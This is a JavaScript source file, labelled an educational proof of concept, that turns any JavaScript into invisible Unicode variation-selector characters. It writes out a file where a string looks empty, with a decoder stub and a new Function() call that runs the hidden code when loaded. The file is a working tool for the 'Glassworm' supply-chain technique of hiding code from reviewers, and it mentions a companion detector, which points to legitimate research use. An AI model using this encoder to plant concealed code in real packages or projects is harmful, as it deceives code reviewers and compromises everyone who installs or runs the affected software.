// ⚠️ EDUCATIONAL POC — DO NOT USE MALICIOUSLY
// Encodes plaintext JavaScript into invisible Unicode variation selectors.
// This demonstrates the Glassworm supply-chain attack technique.

'use strict';

const fs = require('fs');
const path = require('path');

/**
 * Encode a single byte (0-255) into an invisible Unicode variation selector.
 * Byte 0-15   → U+FE00 to U+FE0F  (Variation Selectors)
 * Byte 16-255 → U+E0100 to U+E01EF (Supplementary Variation Selectors)
 */
function encodeByte(byte) {
  if (byte < 16) {
    return String.fromCodePoint(0xFE00 + byte);
  }
  return String.fromCodePoint(0xE0100 + byte - 16);
}

/**
 * Encode a plaintext string into a string of invisible Unicode characters.
 * The output looks empty in editors but contains the full payload.
 */
function encode(text) {
  const buffer = Buffer.from(text, 'utf-8');
  let result = '';
  for (const byte of buffer) {
    result += encodeByte(byte);
  }
  return result;
}

/**
 * Encode plaintext and write a JS file with the invisible payload.
 * The generated file contains a decoder stub + invisible string.
 */
function encodeToFile(text, outputPath) {
  const invisible = encode(text);
  // The output file contains:
  // 1. A decoder function (visible)
  // 2. A string literal that looks empty but contains the encoded payload
  const fileContent =
`// [!] EDUCATIONAL POC -- DO NOT USE MALICIOUSLY
// This file appears to contain an empty string, but it holds an invisible payload.
// Use a hex editor or the glassworm-detector to reveal the hidden content.

const _d = v => [...v].map(w => (
  w = w.codePointAt(0),
  w >= 0xFE00 && w <= 0xFE0F ? w - 0xFE00 :
  w >= 0xE0100 && w <= 0xE01EF ? w - 0xE0100 + 16 : null
)).filter(n => n !== null);

// The string below looks empty but contains ${Buffer.from(text, 'utf-8').length} encoded bytes:
const _p = \`${invisible}\`;

new Function(Buffer.from(_d(_p)).toString('utf-8'))();
`;

  fs.writeFileSync(outputPath, fileContent, 'utf-8');
  return { bytes: Buffer.from(text, 'utf-8').length, outputPath };
}

// CLI usage: node glassworm-encoder.js --file <input.js> --output <output.js>
//        or: node glassworm-encoder.js "<inline payload>"
if (require.main === module) {
  const args = process.argv.slice(2);
  let payload;
  let outputPath = path.join(__dirname, 'payload-demo.js');

  const fileIdx = args.indexOf('--file');
  const outIdx = args.indexOf('--output');

  if (fileIdx !== -1 && args[fileIdx + 1]) {
    payload = fs.readFileSync(args[fileIdx + 1], 'utf-8');
  } else if (args.length > 0 && !args[0].startsWith('--')) {
    payload = args[0];
  } else {
    console.error('Usage: node glassworm-encoder.js --file <input.js> [--output <output.js>]');
    console.error('   or: node glassworm-encoder.js "<inline JS code>"');
    process.exit(1);
  }

  if (outIdx !== -1 && args[outIdx + 1]) {
    outputPath = args[outIdx + 1];
  }

  const result = encodeToFile(payload, outputPath);
  console.log(`✓ Encoded ${result.bytes} bytes → ${result.outputPath}`);
  console.log('  The payload is now invisible in code editors.');
}

module.exports = { encode, encodeByte, encodeToFile };
